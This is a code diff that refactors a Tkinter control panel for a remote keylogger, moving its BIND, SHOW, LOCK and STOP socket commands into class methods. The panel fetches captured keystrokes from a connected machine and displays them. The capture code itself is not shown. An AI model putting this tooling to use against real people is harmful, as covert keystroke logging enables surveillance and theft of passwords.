@@ -3,46 +3,6 @@ from tkinter import *
 from tkinter import Button, Text
 from DC_Constant import BACKGROUND, BUFFERSIZE, WIDTH, HEIGHT, FORMAT
 
-
-def bind(main_connect, button):
-    main_connect.sendall("BIND".encode(FORMAT))
-    if button["text"] == "BIND":
-        button.configure(text="UNBIND")
-    else:
-        button.configure(text="BIND")
-    return
-
-
-def show(main_connect, textbox):
-    main_connect.sendall("SHOW".encode(FORMAT))
-    data = main_connect.recv(BUFFERSIZE).decode(FORMAT)
-    
-    textbox.config(state="normal")
-    textbox.insert(tk.END, data)
-    textbox.config(state="disable")
-    return
-
-
-def delete(textbox):
-    textbox.config(state="normal")
-    textbox.delete("1.0", "end")
-    textbox.config(state="disable")
-    return
-
-
-def lock(main_connect, button):
-    main_connect.sendall("LOCK".encode(FORMAT))
-    if button["text"] == "LOCK":
-        button.configure(text="UNLOCK")
-    else:
-        button.configure(text="LOCK")
-    return
-
-
-def back():
-    return
-
-
 class Keylogger(Frame):
     def __init__(self, parent, client):
         Frame.__init__(self, parent)
@@ -57,6 +17,9 @@ class Keylogger(Frame):
         parent.geometry("900x500+200+200")
         self.grid(row=0, column=0, sticky="nsew")
 
+        self.client=client
+        self.status=True
+        
         self.box = Text(
             self,
             height=200,
@@ -80,7 +43,7 @@ class Keylogger(Frame):
             fg="black",
             borderwidth=3,
             highlightthickness=2,
-            command=lambda: bind(client, self.button_bind),
+            command=lambda: self.bind(client, self.button_bind),
         )
 
         self.button_bind.place(x=733, y=113, width=135, height=53.0)
@@ -95,7 +58,7 @@ class Keylogger(Frame):
             fg="black",
             borderwidth=3,
             highlightthickness=2,
-            command=lambda: lock(client, self.button_lock),
+            command=lambda: self.lock(client, self.button_lock),
         )
 
         self.button_lock.place(x=733, y=250, width=135, height=53)
@@ -110,7 +73,7 @@ class Keylogger(Frame):
             fg="black",
             borderwidth=3,
             highlightthickness=2,
-            command=lambda: show(client, self.box),
+            command=lambda: self.show(client, self.box),
         )
 
         self.button_show.place(x=32, y=113, width=135, height=53)
@@ -125,7 +88,7 @@ class Keylogger(Frame):
             fg="black",
             borderwidth=3,
             highlightthickness=2,
-            command=lambda: delete(self.box),
+            command=lambda: self.delete(self.box),
         )
 
         self.button_delete.place(x=32, y=250, width=135, height=53)
@@ -140,7 +103,48 @@ class Keylogger(Frame):
             fg="black",
             borderwidth=3,
             highlightthickness=2,
-            command=back,
+            command=lambda:self.back(),
         )
         
         self.button_back.place(x=382, y=418, width=135, height=53)
+
+    def bind(self, main_connect, button):
+        main_connect.sendall("BIND".encode(FORMAT))
+        if button["text"] == "BIND":
+            button.configure(text="UNBIND")
+        else:
+            button.configure(text="BIND")
+        return
+
+
+    def show(self, main_connect, textbox):
+        main_connect.sendall("SHOW".encode(FORMAT))
+        data = main_connect.recv(BUFFERSIZE).decode(FORMAT)
+    
+        textbox.config(state="normal")
+        textbox.insert(tk.END, data)
+        textbox.config(state="disable")
+        return
+
+
+    def delete(self, textbox):
+        textbox.config(state="normal")
+        textbox.delete("1.0", "end")
+        textbox.config(state="disable")
+        return
+
+
+    def lock(self, main_connect, button):
+        main_connect.sendall("LOCK".encode(FORMAT))
+        if button["text"] == "LOCK":
+            button.configure(text="UNLOCK")
+        else:
+            button.configure(text="LOCK")
+        return
+
+
+    def back(self):
+        self.status = False
+        self.destroy()
+        self.client.sendall("STOP".encode())
+        return
